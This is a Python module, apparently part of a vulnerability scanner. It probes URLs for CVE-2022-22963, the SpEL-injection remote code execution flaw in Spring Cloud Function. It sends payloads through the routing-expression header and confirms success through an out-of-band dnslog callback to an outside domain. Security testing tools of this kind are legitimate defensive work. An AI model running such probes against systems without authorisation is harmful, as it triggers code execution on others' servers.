#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.api.dns import dns
from lib.tool.md5 import md5, random_md5, random_int_1, random_int_2
from lib.tool.logger import logger
from thirdparty import requests
from time import sleep

def cve_2022_22963_scan(self, url):
    ''' Spring Cloud Function中RoutingFunction类的apply方法
            将请求头中的spring.cloud.function.routing-expression参数作为Spel表达式进行处理; 
            造成了Spel表达式注入漏洞, 当使用路由功能时, 攻击者可利用该漏洞远程执行任意代码
    '''
    sessid = 'ff864206449349277d8c5b0df7897d4b'
    md = random_md5()                                       # * 随机md5值, 8位
    dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名

    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'RCE'
    vul_info['vul_id'] = 'CVE-2022-22963'
    vul_info['vul_method'] = 'POST'

    for payload in self.cve_2022_22963_payloads:
        path = payload['path']
        data = payload['data']
        headers = payload['headers']
        target = url + path
        # * 在payload里面添加dnslog域名
        headers['spring.cloud.function.routing-expression'] = headers['spring.cloud.function.routing-expression'].replace('dnsdomain', dns_domain)

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['headers'] = headers
        vul_info['target'] = target

        try:
            res = requests.post(
                target, 
                timeout=self.timeout, 
                headers=headers,
                data=data, 
                proxies=self.proxies, 
                verify=False
            )
            logger.logging(vul_info, res.status_code, res)                        # * LOG

            sleep(2)                                                # * dns查询可能较慢, 等一会
            if (md in dns.result(md, sessid)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Payload': res
                }
                return results
        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
